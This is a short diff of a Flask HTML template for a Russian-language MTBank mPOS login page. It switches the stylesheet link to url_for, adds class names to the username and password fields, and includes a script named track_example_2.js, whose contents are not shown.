@@ -5,7 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTBank mPOS - Кабинет пользователя</title>
-    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_3.4.css" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_3.4.css') }}">
+
 </head>
 
 <body>
@@ -16,11 +17,11 @@
         <div class="input-group">
             <div class="input-item">
                 <label for="username">Имя пользователя</label>
-                <input type="text" id="username" placeholder="Введите имя пользователя">
+                <input class="имя пользователя" type="text" id="username" placeholder="Введите имя пользователя">
             </div>
             <div class="input-item">
                 <label for="password">Пароль</label>
-                <input type="password" id="password" placeholder="Введите пароль">
+                <input class="пароль" type="password" id="password" placeholder="Введите пароль">
             </div>
         </div>
 
@@ -30,6 +31,7 @@
 
         <a href="#" class="forgot-password">Забыли пароль?</a>
     </div>
+    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 
 </html>
